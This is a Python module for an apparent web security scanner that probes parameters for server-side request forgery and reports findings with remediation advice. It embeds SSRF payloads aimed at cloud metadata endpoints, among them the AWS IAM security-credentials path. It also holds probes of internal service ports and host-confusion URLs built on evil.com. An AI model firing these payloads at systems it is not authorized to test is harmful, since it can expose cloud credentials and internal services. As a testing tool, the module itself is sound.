#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) Vulnerability Scanner.
Tests for SSRF vulnerabilities that allow internal network access.

References:
    - OWASP: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
    - PortSwigger: https://portswigger.net/web-security/ssrf
    - CWE-918: Server-Side Request Forgery (SSRF)
"""

import re
import socket
import hashlib
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """SSRF vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Server-Side Request Forgery (SSRF) Detection"
        self.callback_token = hashlib.md5(self.target_url.encode()).hexdigest()[:12]
        
        # SSRF payloads targeting internal services
        self.ssrf_payloads = {
            'aws_metadata': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
            ],
            'internal_services': [
                'http://127.0.0.1/',
                'http://localhost/',
                'http://0.0.0.0/',
                'http://[::1]/',
                'http://127.0.0.1:22/',
                'http://127.0.0.1:3306/',
                'http://127.0.0.1:5432/',
                'http://127.0.0.1:6379/',
                'http://127.0.0.1:9200/',
                'http://127.0.0.1:8080/',
            ],
            'cloud_metadata': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://100.100.100.200/latest/meta-data/',
            ],
            'url_obfuscation': [
                'http://127.0.0.1@evil.com/',
                'http://evil.com@127.0.0.1/',
                'http://127.1/',
                'http://0/',
                'http://0x7f000001/',
                'http://2130706433/',
            ],
        }
        
        # SSRF-vulnerable parameter names
        self.ssrf_params = [
            'url', 'uri', 'path', 'file', 'document',
            'link', 'src', 'source', 'target', 'dest',
            'destination', 'redirect', 'proxy', 'fetch',
            'load', 'image', 'img', 'download', 'callback',
            'webhook', 'endpoint', 'api', 'service',
        ]
        
        # AWS metadata indicators
        self.aws_indicators = [
            'ami-id',
            'instance-id',
            'instance-type',
            'local-hostname',
            'public-hostname',
            'security-credentials',
            'placement/availability-zone',
        ]
        
        # Internal service indicators
        self.internal_indicators = [
            'root:x:0:0',      # /etc/passwd via file://
            '[fonts]',          # Windows win.ini
            'SSH-2.0',         # SSH banner
            'mysql',           # MySQL response
            'redis_version',   # Redis INFO
            'elasticsearch',   # ES response
        ]
    
    def run(self) -> Dict:
        """Execute SSRF vulnerability tests."""
        logger.info(f"Starting {self.module_name} for {self.target_url}")
        
        result = {
            'module': self.module_name,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'internal_access': False,
            'cloud_metadata_access': False,
            'findings': []
        }
        
        # Discover test parameters
        test_params = self._discover_parameters()
        
        for url, params in test_params:
            for param_name in params:
                result['parameters_tested'].append(param_name)
                vuln_info = self._test_parameter(url, param_name, params)
                
                if vuln_info:
                    result['vulnerable_parameters'].append({
                        'url': url,
                        'parameter': param_name,
                        'info': vuln_info,
                    })
                    
                    if vuln_info.get('internal'):
                        result['internal_access'] = True
                    if vuln_info.get('cloud'):
                        result['cloud_metadata_access'] = True
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            info = vuln['info']
            severity = 'critical' if info.get('cloud') else 'high'
            
            self.findings.append({
                'title': f"SSRF vulnerability in '{vuln['parameter']}' parameter",
                'severity': severity,
                'description': (
                    f"SSRF vulnerability in '{vuln['parameter']}' at {vuln['url']}. "
                    f"Access to: {info.get('target', 'internal resources')}. "
                    "SSRF can expose internal services, cloud metadata, and sensitive data."
                ),
                'recommendation': (
                    "1. Implement allowlist for allowed URLs/hosts\n"
                    "2. Block requests to internal/private IP ranges\n"
                    "3. Disable HTTP redirects\n"
                    "4. Validate and sanitize all URL inputs\n"
                    "5. Use network segmentation\n"
                    "6. Block cloud metadata endpoints (169.254.169.254)"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-918',
                'cvss_score': 9.5 if info.get('cloud') else 8.0,
                'evidence': f"Target: {info.get('target')}",
            })
        
        result['findings'] = self.findings
        return result
    
    def _discover_parameters(self) -> List:
        """Discover SSRF-vulnerable parameters."""
        test_urls = []
        
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                form_url = urljoin(self.target_url, action) if action else self.target_url
                
                inputs = {}
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name', '')
                    if name and any(p in name.lower() for p in self.ssrf_params):
                        inputs[name] = input_tag.get('value', '')
                
                if inputs:
                    test_urls.append((form_url, inputs))
        
        # Add common parameters
        for param in self.ssrf_params[:10]:
            test_urls.append((self.target_url, {param: 'test'}))
        
        return test_urls[:15]
    
    def _test_parameter(self, url: str, param_name: str, params: Dict) -> Optional[Dict]:
        """Test a parameter for SSRF."""
        # Test AWS metadata access
        for payload in self.ssrf_payloads['aws_metadata'][:1]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp:
                for indicator in self.aws_indicators:
                    if indicator in resp.text:
                        return {
                            'internal': True,
                            'cloud': True,
                            'target': 'AWS Metadata',
                            'indicator': indicator,
                        }
        
        # Test internal service access
        for payload in self.ssrf_payloads['internal_services'][:5]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.internal_indicators:
                    if indicator in resp.text[:500]:
                        return {
                            'internal': True,
                            'target': payload,
                            'indicator': indicator,
                        }
        
        return None